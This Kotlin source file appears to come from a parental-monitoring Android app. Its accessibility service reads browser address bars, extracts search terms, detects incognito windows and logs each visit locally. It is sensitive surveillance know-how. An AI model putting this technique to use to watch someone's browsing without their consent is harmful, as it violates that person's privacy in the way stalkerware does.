package com.family.monitor

import android.accessibilityservice.AccessibilityService
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject

/**
 * رصد التصفح والبحث من شريط العنوان في أي متصفح (الوضع العادي والخفي).
 *
 * آلية العمل الصحيحة:
 *  1) عند أي تغيير نافذة/محتوى في متصفح: نؤجل القراءة 600 مللي (حتى يستقر شريط العنوان).
 *  2) نقرأ شجرة الواجهة ونبحث عن شريط العنوان نفسه (حقل url_bar في كروم، location_bar في سامسونج...).
 *  3) نتحقق أن النص رابط حقيقي أو نص بحث، ونستبعد صفحات النظام الداخلية (chrome:// ...).
 *  4) إذا كان رابط بحث (google/bing/...) نستخرج كلمة البحث من المعامل q ونحفظ الرابط معًا.
 */
class UrlAccessibilityService : AccessibilityService() {

    companion object {
        private val SEARCH_KEYS = listOf("q", "query", "search_query", "text", "wd", "k", "p", "s")
        private val SEARCH_HOSTS = listOf(
            "google.", "bing.com", "duckduckgo.com", "search.yahoo", "yandex.",
            "baidu.com", "ecosia.org", "startpage.com", "ask.com"
        )
        /** صفحات داخلية/ضوضاء لا تُسجل أبدًا */
        private val NOISE_PREFIXES = listOf(
            "chrome://", "about:", "edge://", "browser://", "chrome-native://",
            "javascript:", "data:", "file://", "content://", "view-source:",
            "intent:", "market://", "about:blank"
        )
        private val ADDRESS_ID_HINTS = listOf("url", "address", "location", "search_box", "searchbox", "omnibox")
        private val INCOGNITO_HINTS = listOf("incognito", "خفي", "تخفي", "private browsing", "تصفح خاص")

        private var lastUrl = ""
        private var lastAt = 0L
    }

    private val handler = Handler(Looper.getMainLooper())
    private val capture = Runnable { doCapture() }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val pkg = event.packageName?.toString() ?: return
        if (!Config.isBrowser(pkg)) return
        val t = event.eventType
        if (t != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            t != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
        ) return

        // تأجيل القراءة حتى يستقر شريط العنوان (الكتابة الحرفية تُصدر عشرات الأحداث)
        handler.removeCallbacks(capture)
        handler.postDelayed(capture, 600)
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    private fun doCapture() {
        val pkg = rootInActiveWindow?.packageName?.toString() ?: return
        if (!Config.isBrowser(pkg)) return

        val incognito = windowHasIncognitoHint(pkg)
        val addressText = readAddressBar(pkg, rootInActiveWindow ?: return) ?: return
        val trimmed = addressText.trim()
        if (trimmed.isEmpty() || trimmed.length > 2000) return

        // استبعاد الضوضاء: صفحات النظام الداخلية لا تُسجل
        val lowered = trimmed.lowercase()
        if (NOISE_PREFIXES.any { lowered.startsWith(it) }) return

        val sameAsLast = trimmed == lastUrl
        if (sameAsLast && System.currentTimeMillis() - lastAt < 60_000) return

        val now = System.currentTimeMillis()
        lastUrl = trimmed
        lastAt = now

        val isUrl = lowered.startsWith("http") || Regex("^[\\w-]+(\\.[\\w-]+)+.*").matches(trimmed)
        val json = JSONObject().put("packageName", pkg).put("app", browserName(pkg))
        if (incognito) json.put("incognito", true)

        if (!isUrl) {
            // نص بحث مكتوب في شريط العنوان
            json.put("type", "SEARCH").put("title", trimmed).put("url", "")
        } else {
            val full = if (lowered.startsWith("http")) trimmed else "https://$trimmed"
            val uri = Uri.parse(full)
            val host = uri.host?.lowercase() ?: ""
            val isSearch = SEARCH_HOSTS.any { host.contains(it) }
            var q: String? = null
            for (k in SEARCH_KEYS) {
                q = uri.getQueryParameter(k)
                if (!q.isNullOrBlank()) break
            }
            if (isSearch && !q.isNullOrBlank()) {
                // بحث حقيقي: نحفظ كلمة البحث + الرابط (لفتحه بالضغط عليه)
                json.put("type", "SEARCH").put("title", q.trim()).put("url", full)
            } else {
                json.put("type", "BROWSER").put("title", host.removePrefix("www.")).put("url", full)
            }
        }

        EventStore.addEvent(applicationContext, json)
    }

    /** يقرأ نص شريط العنوان من شجرة الواجهة */
    private fun readAddressBar(pkg: String, root: AccessibilityNodeInfo): String? {
        val stack = ArrayDeque<AccessibilityNodeInfo>()
        stack.add(root)
        var scanned = 0
        var bestById: String? = null
        var bestGenericUrl: String? = null

        while (stack.isNotEmpty() && scanned < 400) {
            val node = stack.removeFirst()
            scanned++
            val text = node.text?.toString()?.trim()
            val viewId = node.viewIdResourceName?.lowercase() ?: ""

            if (!text.isNullOrBlank() && text.length <= 2000) {
                val looksAddress = ADDRESS_ID_HINTS.any { viewId.contains(it) && !viewId.contains("icon") && !viewId.contains("clear") }
                val looksUrl = Regex("^[\\w-]+(\\.[\\w-]+)+.*").matches(text) || text.startsWith("http", true)
                val isEditText = node.className?.toString()?.contains("EditText") == true

                if (looksAddress) {
                    // الأولوية القصوى: حقل شريط العنوان المعروف بالمعرّف
                    if (bestById == null || (isEditText && bestById != null)) bestById = text
                } else if (looksUrl && bestGenericUrl == null) {
                    bestGenericUrl = text
                }
            }

            if (node.isEditable && !text.isNullOrBlank() && bestById == null && looksLikeAddressField(node)) {
                bestById = text
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { stack.add(it) }
            }
        }
        return bestById ?: bestGenericUrl
    }

    private fun looksLikeAddressField(node: AccessibilityNodeInfo): Boolean {
        val id = node.viewIdResourceName?.lowercase() ?: ""
        return id.isNotEmpty() && ADDRESS_ID_HINTS.any { id.contains(it) }
    }

    private fun windowHasIncognitoHint(pkg: String): Boolean {
        try {
            val root = rootInActiveWindow ?: return false
            // فحص سريع لأول 60 عقدة فقط بحثًا عن كلمة التخفي
            val stack = ArrayDeque<AccessibilityNodeInfo>()
            stack.add(root)
            var n = 0
            while (stack.isNotEmpty() && n < 60) {
                val node = stack.removeFirst()
                n++
                val txt = node.text?.toString() ?: node.contentDescription?.toString() ?: ""
                if (INCOGNITO_HINTS.any { txt.contains(it, true) }) return true
                for (i in 0 until node.childCount) node.getChild(i)?.let { stack.add(it) }
            }
        } catch (_: Exception) {}
        return false
    }

    private fun browserName(pkg: String): String = when {
        pkg.contains("chrome") -> "Chrome"
        pkg == "com.sec.android.app.sbrowser" || pkg == "com.samsung.android.internet" -> "Samsung Internet"
        pkg.contains("firefox") || pkg.contains("focus") -> "Firefox"
        pkg.contains("emmx") -> "Edge"
        pkg.contains("opera") -> "Opera"
        pkg.contains("brave") -> "Brave"
        pkg.contains("UCMobile") || pkg.contains("uc.browser") -> "UC Browser"
        pkg.contains("duckduckgo") -> "DuckDuckGo"
        pkg.contains("googlequicksearchbox") || pkg.contains("searchlite") -> "بحث جوجل"
        pkg.contains("vivaldi") -> "Vivaldi"
        pkg.contains("kiwi") -> "Kiwi"
        pkg.contains("yandex") -> "Yandex"
        else -> pkg.substringAfterLast('.').ifBlank { "متصفح" }
    }
}
